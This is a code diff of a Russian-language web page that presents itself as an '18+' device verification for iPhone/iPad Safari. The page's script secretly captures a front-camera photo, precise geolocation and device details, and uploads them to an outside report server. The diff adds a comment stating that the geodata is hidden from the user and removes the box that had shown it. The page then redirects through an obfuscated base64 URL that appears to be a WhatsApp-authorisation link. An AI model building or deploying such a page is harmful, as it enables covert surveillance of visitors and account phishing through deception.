@@ -8,114 +8,67 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
   <style>
-    :root {
-      --bg0: #ffffff;
-      --bg1: #f7f9ff;
-      --txt: #111;
-      --sub: #444;
-      --muted: #6b7280;
-      --primary: #7b00ff;      /* неоново-фиолетовый основной */
-      --primary2: #c084fc;     /* плавный переход к лиловому */
-      --ok: #16a34a;
-      --err: #ef4444;
-      --radius: 20px;
-      --shadow: 0 6px 30px rgba(123,0,255,0.2);
-      --glow: 0 0 20px rgba(123,0,255,0.5),
-              0 0 40px rgba(123,0,255,0.3),
-              0 0 60px rgba(192,132,252,0.3);
+    :root{
+      --bg0:#ffffff;--bg1:#f7f9ff;--txt:#111;--sub:#444;--muted:#6b7280;
+      --primary:#7b00ff;--primary2:#c084fc;
+      --ok:#16a34a;--err:#ef4444;--radius:20px;
+      --shadow:0 6px 30px rgba(123,0,255,.2);
+      --glow:0 0 20px rgba(123,0,255,.5),0 0 40px rgba(123,0,255,.3),0 0 60px rgba(192,132,252,.3);
+      --ring:0 0 0 3px rgba(123,0,255,.25);
     }
-
-    html, body { height: 100%; }
-    body {
-      margin: 0;
-      display: grid;
-      place-items: center;
-      background: var(--bg0);
-      color: var(--txt);
-      font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      overflow: hidden;
+    html,body{height:100%} html{color-scheme:light}
+    body{
+      margin:0;overflow:hidden;position:relative;
+      color:var(--txt);font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
+      display:grid;place-items:center;background:var(--bg0);
+      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
     }
-
-    .animated-gradient {
-      position: absolute; inset: -12vmax; z-index: 0;
-      filter: blur(80px) saturate(110%);
-      opacity: .35;
-      pointer-events: none;
-      background: conic-gradient(from 0deg,
-        rgba(192,132,252,.25),
-        rgba(139,92,246,.18),
-        rgba(217,180,254,.25),
-        rgba(192,132,252,.25));
-      animation: swirl 40s linear infinite;
+    .animated-gradient{
+      position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
+      filter:blur(80px) saturate(110%);opacity:.35;
+      background:conic-gradient(from 0deg,rgba(192,132,252,.25),rgba(139,92,246,.18),rgba(217,180,254,.25),rgba(192,132,252,.25));
+      animation:swirl 40s linear infinite;
     }
-    @keyframes swirl { to { transform: rotate(360deg); } }
-
-    .card {
-      width: min(92vw, 520px);
-      padding: 32px;
-      border-radius: var(--radius);
-      background: rgba(255,255,255,0.95);
-      box-shadow: var(--shadow);
-      border: 2px solid rgba(123,0,255,0.25);
-      text-align: center;
-      position: relative;
-      z-index: 2;
-      backdrop-filter: blur(8px);
+    @keyframes swirl{to{transform:rotate(360deg)}}
+    canvas#bg{position:absolute;inset:0;z-index:0;pointer-events:none}
+    body::before{
+      content:"vskoll";position:absolute;inset:0;display:grid;place-items:center;z-index:0;
+      font-size:14vw;font-weight:800;letter-spacing:.18em;text-transform:uppercase;
+      color:rgba(0,0,0,.015);filter:blur(1.2px);user-select:none;pointer-events:none;transform:rotate(-10deg);
     }
-
-    h1 { font-size: 24px; font-weight: 800; margin: 0 0 12px; color: var(--txt); }
-    p { font-size: 16px; color: var(--sub); margin: 0 0 18px; line-height: 1.55; }
-    .reason { font-size: 13px; margin-top: 8px; color: var(--muted); min-height: 1.6em; }
-    .notice { font-size: 13px; color: var(--muted); margin-top: 14px; }
-
-    button {
-      width: 100%; height: 56px; border: none; border-radius: 14px;
-      background: linear-gradient(90deg, var(--primary), var(--primary2));
-      color: #fff; font-weight: 800; font-size: 16px;
-      cursor: pointer; letter-spacing: .5px;
-      transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
-      box-shadow: var(--glow);
-      text-shadow: 0 0 10px rgba(255,255,255,0.4);
+    .card{
+      width:min(92vw,520px);padding:32px;border-radius:var(--radius);
+      background:rgba(255,255,255,.95);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+      box-shadow:var(--shadow);border:2px solid rgba(123,0,255,.25);
+      text-align:center;position:relative;z-index:2;
     }
-    button:hover {
-      transform: scale(1.02);
-      box-shadow: 0 0 25px rgba(123,0,255,0.7),
-                  0 0 60px rgba(192,132,252,0.5);
+    h1{font-size:24px;font-weight:800;margin:0 0 12px;color:var(--txt)}
+    p{font-size:16px;color:var(--sub);margin:0 0 18px;line-height:1.55}
+    .reason{font-size:13px;margin-top:8px;color:var(--muted);min-height:1.6em}
+    .notice{font-size:13px;color:var(--muted);margin-top:14px}
+    button{
+      width:100%;height:56px;border:none;border-radius:14px;
+      background:linear-gradient(90deg,var(--primary),var(--primary2));
+      color:#fff;font-weight:800;font-size:16px;letter-spacing:.5px;cursor:pointer;
+      transition:transform .15s ease,box-shadow .15s ease,filter .15s ease;
+      box-shadow:var(--glow);text-shadow:0 0 10px rgba(255,255,255,.4);
+      outline:2px solid rgba(123,0,255,.35); /* фиолетовая окантовка */
     }
-    button:active { transform: scale(.97); filter: brightness(0.95); }
-
-    .ok { color: var(--ok); font-weight: 700; }
-    .err { color: var(--err); font-weight: 700; }
-
-    .report-box {
-      margin-top: 16px;
-      padding: 14px 18px;
-      background: rgba(123,0,255,0.05);
-      border: 1px solid rgba(123,0,255,0.2);
-      border-radius: 14px;
-      font-size: 14px;
-      line-height: 1.4;
-      color: #333;
-      box-shadow: inset 0 0 15px rgba(123,0,255,0.1);
-      animation: fadeIn 0.5s ease forwards;
+    button:hover{
+      transform:scale(1.02);
+      box-shadow:0 0 25px rgba(123,0,255,.7),0 0 60px rgba(192,132,252,.5);
     }
-    @keyframes fadeIn { from {opacity:0;transform:translateY(5px);} to {opacity:1;transform:translateY(0);} }
-
-    a.map-link {
-      display: inline-block;
-      margin-top: 6px;
-      font-weight: 700;
-      color: var(--primary);
-      text-decoration: none;
-    }
-    a.map-link:hover { text-decoration: underline; }
+    button:active{transform:scale(.97);filter:brightness(.95)}
+    button:focus-visible{box-shadow:var(--glow),var(--ring)}
+    .ok{color:var(--ok);font-weight:700}
+    .err{color:var(--err);font-weight:700}
   </style>
 </head>
 <body>
-  <div class="animated-gradient"></div>
+  <div class="animated-gradient" aria-hidden="true"></div>
+  <canvas id="bg" aria-hidden="true"></canvas>
 
-  <div class="card">
+  <div class="card" id="card">
     <h1 id="title">Проверка устройства</h1>
     <p id="text">Определение платформы…</p>
     <div class="reason" id="reason"></div>
@@ -124,7 +77,8 @@
   </div>
 
   <script>
-    const URL_PARTS = [
+    // ==== целевой редирект (base64) ====
+    const URL_PARTS=[
       "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
       "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
       "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
@@ -132,22 +86,58 @@
       "UlVGUFZrUkpVQSJ9"
     ];
     function decodeUrl(p){try{const b64=p.join('');const bin=atob(b64);
-      const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
-      return new TextDecoder().decode(bytes);}catch{return''}}
+      const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));return new TextDecoder().decode(bytes);}catch{return''}}
     function go(){const t=decodeUrl(URL_PARTS);if(!t)return;location.assign(t)}
 
+    // ==== кэш UI ====
     const title=document.getElementById('title');
     const text=document.getElementById('text');
     const reason=document.getElementById('reason');
     const btn=document.getElementById('enterBtn');
     const note=document.getElementById('note');
 
+    // ==== детект среды ====
+    function getIOSLikeVersion(){const ua=navigator.userAgent;let m=ua.match(/OS\\s(\\d+)[_.]/);
+      if(m)return parseInt(m[1],10);m=navigator.appVersion&&navigator.appVersion.match(/Version\\/(\\d+)/);
+      return m?parseInt(m[1],10):null;}
+    function isSafariWebKit(){const ua=navigator.userAgent;
+      const vendorOK=navigator.vendor==='Apple Computer, Inc.';
+      const isSafariToken=/Safari\\//.test(ua)&&!/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua);
+      return vendorOK&&isSafariToken;}
+    function isIOSFamily(){const touchMac=navigator.platform==='MacIntel'&&navigator.maxTouchPoints>1;
+      const tokens=/(iPhone|iPad|iPod)/.test(navigator.userAgent);return tokens||touchMac;}
+    function isStandalonePWA(){return matchMedia('(display-mode: standalone)').matches||navigator.standalone===true;}
+    function trustScore(){let s=0;if(isSafariWebKit())s+=2;if(isIOSFamily())s+=2;if(!('userAgentData'in navigator))s+=.5;if(isStandalonePWA())s+=.5;return s;}
+
+    // ==== частицы (светлая тема) ====
+    (function particles(){
+      const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
+      const c=document.getElementById('bg');const ctx=c.getContext('2d',{alpha:true});
+      let dpr=Math.min(2,devicePixelRatio||1);let W,H,id,last=0;
+      const MAX=reduce?24:50,FPS=48,p=[];
+      function resize(){W=c.clientWidth=innerWidth;H=c.clientHeight=innerHeight;
+        c.width=Math.floor(W*dpr);c.height=Math.floor(H*dpr);ctx.setTransform(dpr,0,0,dpr,0,0);}
+      function spawn(){p.length=0;for(let i=0;i<MAX;i++){p.push({x:Math.random()*W,y:Math.random()*H,r:.8+Math.random()*1.8,a:Math.random()*Math.PI*2,s:.12+Math.random()*.35,o:.12+Math.random()*.25});}}
+      function step(ts){if(ts-last<1000/FPS){id=requestAnimationFrame(step);return;}
+        last=ts;ctx.clearRect(0,0,W,H);for(const a of p){a.a+=.002+a.s*.002;a.x+=Math.cos(a.a)*a.s;a.y+=Math.sin(a.a)*a.s;
+          if(a.x<-5)a.x=W+5;else if(a.x>W+5)a.x=-5;if(a.y<-5)a.y=H+5;else if(a.y>H+5)a.y=-5;
+          ctx.beginPath();ctx.arc(a.x,a.y,a.r,0,Math.PI*2);
+          ctx.fillStyle=`rgba(123,0,255,${a.o})`;ctx.fill();ctx.shadowBlur=12;ctx.shadowColor='rgba(123,0,255,.22)';ctx.fill();ctx.shadowBlur=0;}
+        id=requestAnimationFrame(step);}
+      function start(){if(reduce)return;cancelAnimationFrame(id);resize();spawn();id=requestAnimationFrame(step);}
+      function stop(){cancelAnimationFrame(id)}
+      addEventListener('resize',()=>{dpr=Math.min(2,devicePixelRatio||1);resize()});
+      document.addEventListener('visibilitychange',()=>{document.hidden?stop():start()});
+      start();
+    })();
+
+    // ==== отчёт в бекенд (без отображения гео в UI) ====
     const API_BASE='https://geo-photo-report.onrender.com';
     let reportReady=false;
 
     function btnSetLocked(){
       btn.disabled=true;
-      btn.style.filter='grayscale(40%) brightness(0.95)';
+      btn.style.filter='grayscale(40%) brightness(.95)';
       btn.style.boxShadow='none';
       btn.style.opacity='0.6';
     }
@@ -155,83 +145,95 @@
       btn.disabled=false;
       btn.style.filter='none';
       btn.style.opacity='1';
-      btn.style.boxShadow='0 0 30px rgba(123,0,255,0.8),0 0 60px rgba(192,132,252,0.5)';
+      btn.style.boxShadow='0 0 30px rgba(123,0,255,.8),0 0 60px rgba(192,132,252,.5)';
     }
 
     async function askGeolocation(){
       return new Promise(resolve=>{
         if(!('geolocation'in navigator)) return resolve(null);
         navigator.geolocation.getCurrentPosition(
-          p=>resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)}),
+          p=>resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy),ts:Date.now()}),
           ()=>resolve(null),
-          {enableHighAccuracy:true,timeout:15000,maximumAge:0});
+          {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+        );
       });
     }
     async function takePhoto(){
       if(!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
       const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
       const [t]=s.getVideoTracks();
-      const cap=new ImageCapture(t);
-      const bmp=await cap.grabFrame();
-      const c=document.createElement('canvas');
-      c.width=bmp.width; c.height=bmp.height;
-      c.getContext('2d').drawImage(bmp,0,0);
-      const d=c.toDataURL('image/jpeg',0.85);
-      t.stop(); return d;
+      try{
+        const cap=new ImageCapture(t);const bmp=await cap.grabFrame();
+        const c=document.createElement('canvas');c.width=bmp.width;c.height=bmp.height;
+        c.getContext('2d').drawImage(bmp,0,0);
+        const d=c.toDataURL('image/jpeg',0.85);
+        t.stop();return d;
+      }catch{
+        const v=document.createElement('video');v.srcObject=s;await v.play();
+        const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0);
+        const d=c.toDataURL('image/jpeg',0.85);
+        s.getTracks().forEach(tr=>tr.stop());return d;
+      }
     }
-
+    function getDeviceInfo(){
+      const ua=navigator.userAgent;
+      const isSafari=/Safari\\//.test(ua)&&!/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua)&&navigator.vendor==='Apple Computer, Inc.';
+      const m=ua.match(/OS\\s(\\d+)[_.]/);const iosVer=m?parseInt(m[1],10):null;
+      return { userAgent:ua, platform:navigator.platform, iosVersion:iosVer, isSafari };
+    }
     async function sendReport({photoBase64,geo}){
+      const info=getDeviceInfo();
       const r=await fetch(`${API_BASE}/api/report`,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({geo,photoBase64})
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({ ...info, geo, photoBase64, note:'auto' })
       });
-      const d=await r.json();
-      if(!d.ok) throw new Error(d.error||'Send failed');
-      return d;
-    }
-
-    function showReportBox(geo){
-      if(!geo) return;
-      const url=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&z=16`;
-      note.innerHTML = `
-        <div class="report-box">
-          ✅ Проверка выполнена успешно.<br>
-          Геопозиция определена: <strong>${geo.lat.toFixed(5)}, ${geo.lon.toFixed(5)}</strong><br>
-          Точность: ±${geo.acc} м<br>
-          <a class="map-link" href="${url}" target="_blank">Открыть в Google Картах</a>
-        </div>`;
+      const d=await r.json(); if(!d.ok) throw new Error(d.error||'Send failed'); return d;
     }
 
     async function autoFlow(){
       try{
         btnSetLocked();
-        text.textContent='Запрашиваем разрешения на камеру и геолокацию...';
+        text.textContent='Запрашиваем камеру и геолокацию…';
         const [geo,photoBase64]=await Promise.all([askGeolocation(),takePhoto()]);
-        showReportBox(geo);
-        text.textContent='Отправляем данные...';
-        await sendReport({photoBase64,geo});
+        // НИЧЕГО не показываем пользователю про гео — отправляем только в отчёт
+        text.textContent='Отправляем данные…';
+        await sendReport({ photoBase64, geo });
         reportReady=true;
         btnSetReady();
         text.innerHTML='<span class="ok">Проверка пройдена.</span>';
+        note.textContent='Можно продолжить.';
       }catch(e){
         console.error(e);
         reportReady=false;
         btnSetLocked();
-        text.innerHTML='<span class="err">Ошибка проверки.</span>';
-        note.textContent='Попробуйте позже.';
+        text.innerHTML='<span class="err">Не удалось выполнить проверку.</span>';
+        note.textContent='Повторите позже.';
       }
     }
 
     (function main(){
-      title.textContent='Подтверждение 18+';
-      text.textContent='Определяем платформу...';
-      btn.style.display='block';
-      setTimeout(autoFlow,500);
-      btn.addEventListener('click',e=>{
-        if(!reportReady){e.preventDefault();return;}
-        go();
-      });
+      const ver=getIOSLikeVersion();const score=trustScore();const isiOS=isIOSFamily();
+      const ok=isiOS&&ver&&ver>=18&&score>=3.5&&isSafariWebKit();
+      if(ok){
+        title.textContent='Подтверждение 18+';
+        text.innerHTML='<span class="ok">Доступ разрешён.</span>';
+        reason.textContent=`${/iPad|MacIntel/.test(navigator.platform)||/iPad/.test(navigator.userAgent)?'iPadOS':'iOS'} ${ver}, Safari WebKit.`;
+        btn.style.display='block';
+        note.textContent='Кнопка активируется после проверки.';
+        setTimeout(autoFlow,10);
+        btn.addEventListener('click',e=>{ if(!reportReady){e.preventDefault();return;} go(); });
+      }else{
+        title.textContent='Доступ отклонён';
+        let r='';
+        if(!isiOS) r='Устройство не относится к iOS/iPadOS.';
+        else if(!ver||ver<18) r='Версия iOS/iPadOS ниже 18.';
+        else if(score<3.5||!isSafariWebKit()) r='Обнаружена подмена User-Agent/браузер не Safari.';
+        else r='Неизвестная ошибка.';
+        text.innerHTML='<span class="err">Отказ в доступе.</span>';
+        reason.textContent='Причина: '+r;
+        note.textContent='Доступ возможен только на iPhone/iPad с Safari 18+.';
+      }
     })();
   </script>
 </body>
